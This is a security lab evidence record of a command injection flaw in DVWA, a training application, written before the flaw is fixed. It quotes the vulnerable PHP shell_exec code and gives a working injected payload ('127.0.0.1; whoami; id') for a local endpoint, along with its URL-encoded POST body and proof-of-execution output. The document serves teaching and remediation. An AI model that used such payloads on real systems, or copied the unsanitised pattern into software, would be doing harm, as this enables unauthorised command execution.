# Evidence 06 - Command Injection (Before Remediation)

## 1. Vulnerability Overview
* **Vulnerable Module**: DVWA Command Execution
* **File Location**: `app/vulnerabilities/exec/source/low.php`
* **Vulnerability Class**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command) / OWASP A03:2021 - Injection
* **Default Security Level**: `low`

## 2. Vulnerable Code Analysis
In `app/vulnerabilities/exec/source/low.php`:
```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    $html .= "<pre>{$cmd}</pre>";
}
```
The application accepts user input `$target` from `$_REQUEST['ip']` and directly concatenates it into a shell string passed to `shell_exec()`. Metacharacters like `;`, `&&`, or `|` are not neutralized, allowing execution of chained system commands.

## 3. Pre-Fix Attack Procedure & Live Payload
* **Endpoint URL**: `http://127.0.0.1:4280/vulnerabilities/exec/`
* **HTTP Method**: `POST`
* **Test Payload**:
  ```text
  127.0.0.1; whoami; id
  ```
* **Executed Command in Linux Container**:
  ```bash
  ping -c 4 127.0.0.1; whoami; id
  ```

## 4. Expected & Actual Vulnerable Behavior
The shell executes `ping` followed sequentially by `whoami` and `id`, displaying the process identity of the web server (`www-data`) in the browser.

### Live Terminal Proof (Automated Test Execution)
```text
[*] Target Payload: 127.0.0.1; whoami; id
[!] EXPLOIT SUCCESS (VULNERABLE): Arbitrary OS commands executed by web server!
    www-data
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 5. Security Impact
- **Remote Code Execution (RCE)**: Full interactive shell access inside the web container.
- **Lateral Movement**: Attackers can access internal Docker networks, inspect environmental secrets, or disrupt container availability (DoS/fork bombs).
- **Pre-Mitigation Risk Rating**: **Likelihood: 3 (High)** × **Impact: 3 (High)** = **9 (High / Critical)**.

## 6. Manual Screenshot Checklist
Capture and place the following screenshots in this directory:
- `cmd-injection-before-browser.png`: Browser view of Command Injection page displaying output of `whoami` (`www-data`) and `id` (`uid=33(www-data)`).
- `cmd-injection-before-post.png`: Browser Network tab or Burp Suite showing the POST body `ip=127.0.0.1%3B+whoami%3B+id&Submit=Submit`.
